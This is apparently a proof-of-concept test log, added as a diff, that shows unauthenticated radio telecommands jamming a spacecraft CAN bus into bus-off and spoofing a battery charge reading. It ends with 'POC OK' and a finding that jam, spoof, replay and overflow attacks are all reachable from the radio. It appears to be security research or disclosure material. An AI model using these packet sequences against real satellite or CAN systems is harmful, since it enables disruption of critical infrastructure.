@@ -1,0 +1,95 @@
+[   0.000] ========================================================================
+[   0.000] V-25 unauthenticated SpaceCAN via radio
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x04 via=usb AES  payload=0000
+[   0.000] --> TC apid=0x0C via=usb AES  payload=-
+[   0.001] <-- TM apid=0x0C AES len=27
+[   0.001] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.002] <-- TM apid=0x1C clear len=8
+[   0.002] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.002] <-- TM apid=0x1C clear len=8
+[   0.002] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.002] <-- TM apid=0x1C clear len=8
+[   0.002] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.003] <-- TM apid=0x1C clear len=8
+[   0.003] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.003] <-- TM apid=0x1C clear len=8
+[   0.003] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.003] <-- TM apid=0x1C clear len=8
+[   0.003] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.003] <-- TM apid=0x1C clear len=8
+[   0.003] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.004] <-- TM apid=0x1C clear len=8
+[   0.004] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.004] <-- TM apid=0x1C clear len=8
+[   0.004] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.004] <-- TM apid=0x1C clear len=8
+[   0.004] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.005] <-- TM apid=0x1C clear len=8
+[   0.005] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.005] <-- TM apid=0x1C clear len=8
+[   0.005] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.005] <-- TM apid=0x1C clear len=8
+[   0.005] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.006] <-- TM apid=0x1C clear len=8
+[   0.006] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.006] <-- TM apid=0x1C clear len=8
+[   0.006] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.006] <-- TM apid=0x1C clear len=8
+[   0.006] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.006] <-- TM apid=0x1C clear len=8
+[   0.006] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.007] <-- TM apid=0x1C clear len=8
+[   0.007] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.007] <-- TM apid=0x1C clear len=8
+[   0.007] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.007] <-- TM apid=0x1C clear len=8
+[   0.007] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.008] <-- TM apid=0x1C clear len=8
+[   0.008] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.008] <-- TM apid=0x1C clear len=8
+[   0.008] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.008] <-- TM apid=0x1C clear len=8
+[   0.008] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.008] <-- TM apid=0x1C clear len=8
+[   0.008] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.009] <-- TM apid=0x1C clear len=8
+[   0.009] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.009] <-- TM apid=0x1C clear len=8
+[   0.009] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.009] <-- TM apid=0x1C clear len=8
+[   0.009] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.010] <-- TM apid=0x1C clear len=8
+[   0.010] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.010] <-- TM apid=0x1C clear len=8
+[   0.010] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.010] <-- TM apid=0x1C clear len=8
+[   0.010] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.011] <-- TM apid=0x1C clear len=8
+[   0.011] --> TC apid=0x1C via=radio AES  payload=00000002840199
+[   0.011] <-- TM apid=0x1C clear len=8
+[   0.011] --> TC apid=0x1C via=radio AES  payload=000000028402017b
+[   0.011] <-- TM apid=0x1C clear len=8
+[   0.011] after junk storm: busoff mask=0x01 err=0
+[   0.011] --> TC apid=0x0C via=usb AES  payload=-
+[   0.012] <-- TM apid=0x0C AES len=27
+[   0.012] --> TC apid=0x1C via=radio AES  payload=030000028400
+[   0.012] <-- TM apid=0x1C clear len=8
+[   0.012] --> TC apid=0x1C via=radio AES  payload=000000028402017b
+[   0.012] <-- TM apid=0x1C clear len=8
+[   0.012] --> TC apid=0x0C via=usb AES  payload=-
+[   0.013] <-- TM apid=0x0C AES len=27
+[   0.013] --> TC apid=0x1C via=radio AES  payload=0000000287020105
+[   0.013] <-- TM apid=0x1C clear len=8
+[   0.013] --> advance(500 ms)
+[   0.013] --> TC apid=0x1D via=usb clear payload=00
+[   0.013] <-- TM apid=0x1D clear len=18
+[   0.013] spoofed charge=5 -> bus=21.14 V safe=1
+[   0.013] --> TC apid=0x1C via=radio clear payload=013c
+[   0.013] <-- TM apid=0x1C clear len=8
+[   0.013] --> TC apid=0x1C via=radio clear payload=04
+[   0.013] <-- TM apid=0x1C clear len=8
+[   0.013] => every CAN-layer attack class (jam/spoof/replay/overflow) is reachable from the raw radio, unauthenticated
+[   0.013] ========================================================================
+[   0.013] POC OK
+[   0.013] ========================================================================
